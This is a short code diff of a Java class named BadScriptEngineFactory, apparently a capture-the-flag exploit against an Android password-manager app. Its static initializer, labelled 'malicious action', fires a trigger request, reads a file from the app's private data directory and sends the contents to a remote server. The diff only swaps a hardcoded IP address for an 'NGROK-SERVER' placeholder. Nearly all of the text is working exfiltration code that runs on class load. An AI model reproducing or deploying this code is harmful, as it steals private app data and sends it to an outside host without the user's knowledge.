@@ -14,12 +14,12 @@ public class BadScriptEngineFactory implements ScriptEngineFactory {
     // Static block for malicious action
     static {
         try {
-            sendRequest("http://103.186.31.38:31339/trigger");
+            sendRequest("http://NGROK-SERVER/trigger");
             System.out.println("Triggered the exploit");
 
             String flagContent = readFlagFile("/data/data/com.aimardcr.pwdmanager/files/");
             if (flagContent != null) {
-                sendFlagToServer("http://103.186.31.38:31339/flag", flagContent);
+                sendFlagToServer("http://NGROK-SERVER/flag", flagContent);
             }
         } catch (Exception e) {
             e.printStackTrace();
